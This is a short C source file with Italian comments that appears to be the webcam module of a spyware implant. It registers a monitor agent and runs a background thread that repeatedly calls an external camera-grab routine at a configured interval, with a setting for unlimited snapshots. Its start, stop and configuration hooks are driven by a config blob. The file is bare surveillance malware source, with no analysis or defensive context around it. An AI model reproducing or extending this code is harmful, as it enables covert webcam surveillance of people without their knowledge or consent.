
#define WCCAPTURE_INTERVAL 10 // In secondi
#define WCLOOP_COUNT 1 // Numero di scatti

DWORD wc_capture_interval = WCCAPTURE_INTERVAL;
DWORD wc_loop_count = WCLOOP_COUNT;
DWORD g_wc_iteration = 0;
DWORD g_wc_delay = 0;

BOOL bPM_wccp = FALSE; // Semaforo per l'uscita del thread
HANDLE hWebCamThread = NULL;

typedef struct {
	DWORD cap_int;
	DWORD loop_count;
} wcam_conf_struct;

extern void CameraGrab();

DWORD WINAPI CaptureWebCamThread(DWORD dummy)
{
	// Prende il numero di scatti configurati
	// 0 = ripetizioni infinite
	while (g_wc_iteration < wc_loop_count || wc_loop_count==0) {
		// Se e' appena partito fa subito uno snapshot
		if (g_wc_delay == 0) {
			CameraGrab();
			g_wc_iteration++;
		}

		// Attesa con controllo di uscita
		while (g_wc_delay < wc_capture_interval*10) {
			Sleep(200); 
			g_wc_delay += 2;
			CANCELLATION_POINT(bPM_wccp);
		}
		g_wc_delay = 0;
	}

	// Aspetta che venga terminato
	LOOP {
		CANCELLATION_POINT(bPM_wccp);
		Sleep(300); 
	}
}


DWORD __stdcall PM_WebCamStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;

	// Ogni volta che lo attivo killa il thread precedente (se esisteva)
	// e lo reinizializza. Non so se quel thread sta ancora scattando o 
	// e' nel loop infinito, ma non mi interessa, lo riattivo lo stesso.
	if (bStartFlag) {
		if (bReset) {
			// Resetta il counter del delay e il numero di iterazioni
			g_wc_iteration = 0;
			g_wc_delay = 0;
		}
		QUERY_CANCELLATION(hWebCamThread, bPM_wccp);
		// Crea il thread che esegue il grab 
		hWebCamThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureWebCamThread, NULL, 0, &dummy);
	} else 
		QUERY_CANCELLATION(hWebCamThread, bPM_wccp);

	return 1;
}


DWORD __stdcall PM_WebCamInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	wcam_conf_struct *wcam_conf;

	// Setta il capture interval della WebCam
	if (conf_ptr) {
		wcam_conf = (wcam_conf_struct *)conf_ptr;
		wc_capture_interval = wcam_conf->cap_int;
		wc_loop_count = wcam_conf->loop_count;
	} else {
		wc_capture_interval = WCCAPTURE_INTERVAL;
		wc_loop_count = WCLOOP_COUNT;
	}
	PM_WebCamStartStop(bStartFlag, TRUE);
	return 1;
}


void PM_WebCamRegister()
{
	// Non ha nessuna funzione di Dispatch
	AM_MonitorRegister(PM_WEBCAMAGENT, NULL, (BYTE *)PM_WebCamStartStop, (BYTE *)PM_WebCamInit, NULL);

	// Inizialmente i monitor devono avere una configurazione di default nel caso
	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
	PM_WebCamInit(NULL, FALSE);
}